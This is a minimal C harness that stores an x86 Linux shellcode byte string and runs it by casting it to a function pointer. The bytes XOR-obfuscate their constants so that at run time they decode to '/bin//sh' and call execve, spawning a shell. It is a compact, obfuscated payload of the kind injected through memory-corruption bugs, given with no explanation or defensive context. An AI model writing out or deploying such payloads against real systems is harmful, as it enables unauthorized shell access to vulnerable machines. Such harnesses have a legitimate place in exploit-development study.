#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] = "\x31\xc9\xf7\xe1\x51\xbb\x6b\x6b\x37\x2c\x81\xf3\x44\x44\x44\x44\x53\x81\xf3\x00\x4d\x1a\x06\x53\x89\xe3\xb0\x0b\xcd\x80";

int main() {
    int (*f)() = (int(*)())shellcode;
    printf("Length: %u\n", strlen(shellcode));
    f();
}

